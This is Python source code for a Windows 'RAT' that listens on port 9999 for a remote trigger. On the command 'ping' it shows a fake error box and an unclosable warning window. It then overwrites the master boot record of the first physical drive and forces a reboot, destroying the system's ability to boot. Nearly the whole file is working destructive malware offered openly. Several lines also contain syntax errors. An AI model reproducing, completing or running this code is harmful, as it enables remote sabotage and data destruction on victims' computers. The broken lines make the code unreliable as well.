# note: uhh, this was fun lol

# MADE FOR WINDOWS
# PLEASE EXECUTE THIS CODE WITH ADMINISTRATOR!
# MAKE SURE TO CHECK PORT: 9999 DOESN'T GET BLOCKED BY THE USERS FIREWALL!
import os 
from os import system 
# os.system('pip install tkinter') | install `tkinter`, but its a built-in Python module. it doesn't need to be installed using `pip`. In fact, trying to install it using `pip` will likely fail. But its here just incase
# os.system('pip install ctypes') | is also a built-in Python module, so it doesn't need to be installed using `pip`. But is here just incase
os.system('pip install pywin32')` # is a Windows-specific package and is required for this script to work.
# the line above requires root to be executed, and so does a lot of the rest of this script, so please be sure to run this script with administrator
import time
import socket
import ctypes
import keyboard
import threading
import tkinter as tk
import subprocess
from win32file import * 
from win32ui import * 
from win32con import * 
from win32gui import * 
from sys import exit 

# |Working on this?| trying to download pywin32 without root|
# import subprocess
# try:
#     import pywin32
# except ImportError:
#     print("this message is not required")
#     subprocess.run(['pip', 'install', 'pywin32'])
#     import pywin32
#

def placeholder1(): # for extra destructive functions if any are wanted to be added
  print(" ")
  prnt("I have also been made known!")

def unclosable(): # unclosable window 
  root = tk.Tk()
  root.title("WARNING (rat)") # display set-off message's title
  root.attributes("-topmost", True)  # Make the window always on top
  
  label = tk.Label(root, text="Your computer has been affected by a RAT! The user has set off destructive code. May god bless your soul.", font=("Arial", 24))# display set-off message on the users pc
  label.pack(pady=20)

  root.protocol("WM_DELETE_WINDOW", lambda: None) # Make the window unclosable 

def write_mbr(message):
    try:
        # Open the physical drive (requires admin privileges)
        with open(r'\\.\PhysicalDrive0', 'r+b') as drive:
            mbr = drive.read(512)
          
            message = message.ljust(512, b'\x00')[:512]
            drive.seek(0)
            drive.write(message)
            print("succses")
    except Exception as e:
        client_socket.send(b'mbr overwrite with message failed... overwriting without message instead')
        mbr_wm()


def mbr(): # overwrite with message
  message = b"OverWriten!    "
  write_mbr(message)
  time.sleep(0.1)
  os.system("shutdown /r /t 1")


def mbr_wm(): # if failed will overwrite without message
  hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0) # Create handle
  WriteFile(hDevice, AllocateReadBuffer(512), None) # Overwrite MBR!
  CloseHandle(hDevice) # Close the handle
  time.sleep(0.1)
  os.system("shutdown /r /t 1")

def gods_wrath():
  warningtitle = 'error'
  warningdescription = 'err: your system ran into an error!'
  if MessageBox(warningdescription, warningtitle, MB_ICONWARNING | MB_YESNO) == 7:
    placeholder1()
    unclosable(
    mbr()

def handle_client(client_socket):
    while True:
        command = client_socket.recv(1024).decode()
        if command.lower() == 'ping':
            for i in range(10, 0, -1):
                client_socket.send(f'ping received, executing in {i}'.encode())
                time.sleep(1)
            client_socket.send(b'loading...')
            gods_wrath() # may god bless us all...
            client_socket.send(b'boom?')
        elif command.lower() == 'exit':
            client_socket.send(b'breaking')
            break
    client_socket.close()

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', 9999))
    server.listen(5)
    print('Listening on port 9999...')
    
    while True:
        client_socket, addr = server.accept()
        print(f'Accepted connection from {addr}')
        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
        client_handler.start()

if __name__ == '__main__':
    main()
